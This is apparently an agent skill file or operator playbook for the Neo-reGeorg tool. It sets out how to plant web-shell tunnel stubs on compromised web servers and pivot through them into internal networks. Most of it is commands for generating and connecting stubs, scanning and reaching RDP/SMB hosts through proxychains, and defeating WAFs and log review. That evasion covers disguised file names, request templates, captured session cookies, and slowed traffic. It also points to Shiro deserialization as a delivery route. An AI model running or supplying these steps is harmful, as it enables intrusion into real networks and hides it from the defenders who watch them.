---
name: neo-regeorg
description: "Auth/lab ref: web-shell SOCKS5 tunnelling framework — pivots a compromised web server into the internal network entirely over HTTP(S) POST when only 80/443 is reachable."
---

# neo-regeorg

**Goal**: Turn a writable/executable web-shell drop on a compromised web server into an encrypted SOCKS5 proxy, tunnelling all traffic inside ordinary HTTP(S) POST bodies. Reach for it when the box has no outbound egress for chisel/ligolo and the only path in is the web port the application already serves.

## Cognitive Stance

Two halves, one shared key:
1. A **tunnel stub** (web shell) uploaded to the target and served at a URL. It speaks a custom BLV (Byte-Length-Value) protocol, body-encoded with a per-key-shuffled base64 alphabet so traffic reads like innocuous base64.
2. **`neoreg.py`** on the operator box. It opens a local SOCKS5 listener (default `127.0.0.1:1080`) and drives the stub with POST requests, reading/writing tunnelled data by polling.

The key (`-k`) seeds both the base64 alphabet shuffle and the protocol offsets — generate and connect **must use the same key** or the client gets format errors and refuses to start. The transport is HTTP, so this is slow and chatty by design: every SOCKS stream is multiplexed over repeated short POSTs. It buys reach, not throughput. The stub file at a public URL is the single loudest IOC in the whole op — treat its lifetime as the blast radius.

## 1. Core Executions

### Generate stubs

```bash
# One key, all languages at once -> ./neoreg_servers/
python3 neoreg.py generate -k 'S0me-Long-Random-Key-20+chars'
#   => neoreg_servers/tunnel.php  tunnel.aspx  tunnel.ashx
#      tunnel.jsp   tunnel.jspx   tunnel.go  tunnel.js  tunnel.cs ...
#   => neoreg_servers/key.txt  (the key, written to disk — scrub it after the op)
```

Harden the generation itself before touching the target:

```bash
# --file: serve a decoy page (e.g. a real 404) on a plain GET, so a browser/scanner
#         hitting the URL sees cover content instead of the health-check string.
python3 neoreg.py generate -k '<key>' --file 404.html

# --httpcode: response code the stub returns (default 200). With -r redirection, keep <400.
python3 neoreg.py generate -k '<key>' --httpcode 404 --file 404.html

# -T / --request-template: wrap the encoded body inside a plausible parameter so POSTs
#    don't carry a raw octet-stream payload. NEOREGBODY is the substitution marker.
#    Must be set identically at generate AND connect time.
python3 neoreg.py generate -k '<key>' -T 'img=data:image/png;base64,NEOREGBODY&save=ok'
```

Upload the single stub matching the target stack (see section 4) to a web-served, writable path.

### Connect

```bash
# Starts SOCKS5 on 127.0.0.1:1080. Runs a health check first ("NeoGeorg says, 'All seems fine'").
python3 neoreg.py -k '<key>' -u https://target.tld/uploads/tunnel.php

# Bind elsewhere / change port
python3 neoreg.py -k '<key>' -u https://target.tld/t.php -l 0.0.0.0 -p 9050

# Port-forward mode instead of SOCKS: local listener -> one fixed internal host:port
python3 neoreg.py -k '<key>' -u https://target.tld/t.php -t 10.0.0.5:3389   # local :1080 -> RDP

# Multiple stub URLs: client randomises requests across them (load-balanced / multi-drop targets)
python3 neoreg.py -k '<key>' -u https://a/t.php -u https://b/t.php -u https://c/t.php
```

If a decoy page was baked in with `--file`, add `--skip` (or `-s`) to bypass the health check, since the GET no longer returns the expected marker:

```bash
python3 neoreg.py -k '<key>' -u https://target.tld/t.php --skip
```

## 2. Proxychains Integration

`neoreg.py` only exposes a SOCKS5 socket — everything else routes through proxychains.

```ini
# /etc/proxychains4.conf  (or ~/.proxychains/proxychains.conf)
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
# TCP connect scan only (-sT): SOCKS carries no raw sockets, so SYN/UDP scans are impossible.
# -Pn: no ICMP over SOCKS. Keep the port set tight — every port is a round-trip of POSTs.
proxychains4 nmap -sT -Pn -n -p 22,80,135,139,445,3389,5985 10.0.0.0/24

# Pivoted service access
proxychains4 impacket-smbclient 'DOM/user:pass@10.0.0.5'
proxychains4 xfreerdp /v:10.0.0.5 /u:admin
```

`proxychains4 -q` suppresses per-hop chatter. Prefer `proxychains4` (preload) over the stale `proxychains`. Expect high latency: keep tool concurrency and timeouts generous, scan scope minimal.

## 3. OPSEC

**The stub is the IOC.** It is a live backdoor sitting at a public URL and will outlast your session in access logs, backups, and the file system.

- **Delete it the moment pivoting is done.** Do not leave it "just in case." If you need persistence, that is a separate, deliberate decision — not a forgotten tunnel stub.
- **Name it to blend.** Never `tunnel.php`. Match the app's own naming — `config.php`, `health.aspx`, `api.ashx`, `ping.jsp`, `assets.jspx`. Drop it in a directory that already holds files of that type and extension.
- **Key strength is real crypto strength.** `neoreg.py` salt-MD5s keys shorter than 28 chars to derive the alphabet seed; longer keys are used verbatim. Use a 28+ char random string so the shuffle isn't trivially recoverable. Never ship `debug` (that key disables the shuffle — plaintext base64).
- **Kill the request signature.** A bare `neoreg.py` POST has a tell: `Content-type: application/octet-stream` and a fixed URL hit repeatedly with predictable body sizes. Counter it:
  - `-T/--request-template` to wrap the body in an app-plausible parameter (set at generate + connect).
  - `-H/--header` to add headers the real app expects (`-H 'X-Requested-With: XMLHttpRequest'`, `-H 'Referer: https://target.tld/app'`).
  - `--cookie` to carry a captured, valid session cookie so requests ride an authenticated session rather than a cold anonymous one.
  - `neoreg.py` already rotates a random real-browser `User-Agent` per run — do not override it with something stale.
- **Prefer HTTPS.** It encrypts bodies on the wire, but a WAF still sees the pattern: one URL, frequent POSTs, uniform body length, steady cadence. Slow the cadence (`--read-interval`, `--write-interval` up) and keep sessions short to stay under volumetric thresholds.
- **Mind the logs.** Every POST lands in the web server access log that ships to SIEM. A drop path under a high-traffic directory hides better than a lonely `/uploads/` hit thousands of times a minute. Scrub generated artifacts on the operator box too — `neoreg_servers/key.txt` holds the plaintext key.
- **Route through Burp when tuning evasion**: `-x/--proxy http://127.0.0.1:8080` sends `neoreg.py` traffic upstream so you can watch exactly what a WAF would see.

## 4. Stub Language Decision Tree

Generate all languages, upload exactly one — the one the target actually executes. Fingerprint the stack first (`Server:`/`X-Powered-By` headers, file extensions in use, error pages).

- **PHP (`tunnel.php`)** — Apache/Nginx+PHP-FPM, LAMP apps, WordPress/Drupal/Laravel. Needs a web-served dir with write access and `.php` execution enabled (watch for `php_admin_flag engine off` on upload dirs). Uses `fsockopen` + sessions; if downstream load-balances, PHP can hold multiple TCP conns per session (pivotnacci-style). For PHP/Node.js add `-a/--async-connect` on the client for the async CONNECT path. Tune PHP connect waits with `--php-connect-timeout`; if the environment blocks session cookies, `--php-skip-cookie`.
- **ASPX (`tunnel.aspx`) / ASHX (`tunnel.ashx`)** — IIS + .NET. Pick when the app is ASP.NET. `.ashx` is a lighter generic handler and often slips through upload filters that block `.aspx`; prefer it if the target accepts it. Needs write to wwwroot or a webroot upload endpoint. .NET stubs support intranet forwarding via `-r/--redirect-url` for load-balanced backends.
- **JSP (`tunnel.jsp`) / JSPX (`tunnel.jspx`)** — Tomcat, JBoss/WildFly, WebLogic, any JEE servlet container. Pick for Java stacks; drop into a servable app context or deploy via a WAR/manager if you have that foothold. `.jspx` (XML syntax) can bypass filters that only match `.jsp`. Java stubs use reflection for broad container compatibility (Tomcat 10+ `jakarta.*` included) and support `-r`/`-R` (`--force-redirect`) to beat the `isLocal()` check and force-forward to internal hosts.
- **Go (`tunnel.go`)** — not a web-shell drop. It is a standalone server you *run as a process* on a box you control (`go run tunnel.go <listen_addr:port>`), then point a `--go`-mode client at it. Specialized — only when you have code execution but no writable web context, i.e. you can run a binary but not drop a served file.

**Node.js (`tunnel.js`)** — in-memory / Express-style JS backends. Set the route in the file (`const path = '/proxy_path';`) and connect with `-a/--async-connect`.

**Hardened-app variants.** Where the app front-ends with Shiro or you only have Tomcat Manager deploy rights, the drop vehicle changes but the stub is unchanged: a Shiro deserialization gadget or a manager WAR push plants the same `tunnel.jsp(x)`, and `neoreg.py` connects to it normally. The stub is stack-specific; the delivery is foothold-specific.

Decision shortcut: **match the extension the server already executes.** If unsure which of two it runs, upload the handler variant (`.ashx`/`.jspx`) first — lighter and more filter-evasive.

## 5. Failure Diagnosis

- **GET/health 200 OK but no working SOCKS / "NeoGeorg is not ready".** The stub responded but the health marker didn't match. Causes, in order: (1) **key mismatch** — generate key != connect key; regenerate or fix `-k`. (2) **stub not executing** — the server returned the file source or a static page (PHP engine off on the dir, wrong extension, .NET not compiled); fetch the URL in a browser — if you see code or a directory listing, execution is disabled. (3) **wrong path** — 404/soft-404 page. (4) **decoy/offset** — if you used `--file`, the GET legitimately won't match; add `--skip`. If the client reports *"ready, but the body needs to be offset"* it even prints the exact `--cut-left N` / `--cut-right N` to strip app-injected wrapping (headers, banners, trailing bytes) around the payload.
- **"Connection refused" on 127.0.0.1:1080 from your tools.** That is your *local* SOCKS socket, not the tunnel — `neoreg.py` isn't running, crashed the health check (see above), or bound a different `-l/-p`. Confirm the listener with `ss -ltnp | grep 1080`.
- **Slow / stalling throughput.** Inherent to HTTP tunnelling and multiplied by RTT to the web server. Levers: raise `--read-buff` (KB sent per POST, default 7, max 50) and lower `--read-interval` / `--write-interval` (ms between polls) to push harder — at the cost of a louder, burstier traffic signature. Keep concurrency sane with `--max-threads`. Never run heavy TCP scans over it; SOCKS-over-HTTP collapses under parallel connect floods. Do discovery with a tiny port list, then act on single services.
- **WAF / proxy blocking (403, 406, RST, challenge pages).** The request pattern tripped a rule. Rotate `-H` headers and `--cookie` to match the real app, switch to a `-T` request template so the body isn't raw octet-stream, move to HTTPS, and slow the intervals to reduce POST frequency. Diagnose precisely by routing through Burp (`-x http://127.0.0.1:8080`) and comparing a blocked request against a legitimate app request. If a single path is rate-limited, spread across multiple stub URLs (`-u ... -u ...`).
- **503s / intermittent format errors behind load balancers.** Only some backend nodes have the stub, or sessions don't stick. `neoreg.py` auto-retries (`--max-retry`, default 10). For Java/.NET use `-r/--redirect-url` to pin forwarding; for PHP the stub already multiplexes connections per session. Dropping the stub to every node, or using multi-URL mode, removes the gamble.

## 6. proxy_router — Multi-Tunnel Engagements

For a single live tunnel, run `neoreg.py` directly. Across an engagement holding several web-shell backdoors, tracking URLs and keys by shell history does not scale — that is [`proxy_router`](https://github.com/k1ubi/proxy_router): a thin manager that collapses every Neo-reGeorg drop into one JSON manifest and a single CLI. It expects Neo-reGeorg cloned into its root (`Neo-reGeorg/neoreg.py`) and `pip install requests psutil`.

```bash
# Manifest: Proxies/proxy.json — one object per backdoor
#   {"id":"1","country":"Local","url":"http://host/tunnel.php","psw":"<key>","type":"Neo-ReGeorg"}

python3 router.py --list                              # enumerate registered backdoors
python3 router.py --proxy-id 1 --port 8080            # GET-reachability check, then spawn neoreg.py (--skip) on :8080
python3 router.py --proxy-id 1 --port 8080 --proxychain  # also append "socks5 127.0.0.1 8080 #router_tunnel" to /etc/proxychains4.conf
python3 router.py --clean                             # strip all #router_tunnel lines back out of proxychains
python3 router.py --killall                           # terminate every running neoreg.py process
```

Each selected proxy binds its own local port, so multiple tunnels run concurrently without clobbering `:1080`. Note it spawns `neoreg.py` with `--skip` (health check bypassed) and detached (stdout/stderr to `/dev/null`) — convenient, but you lose the live diagnostics from section 5, so validate a new drop once with `neoreg.py` directly before registering it. `--proxychain` requires write access to `/etc/proxychains4.conf` (root/sudo). Run `--clean` and `--killall` as part of teardown in the same breath as deleting the remote stubs.
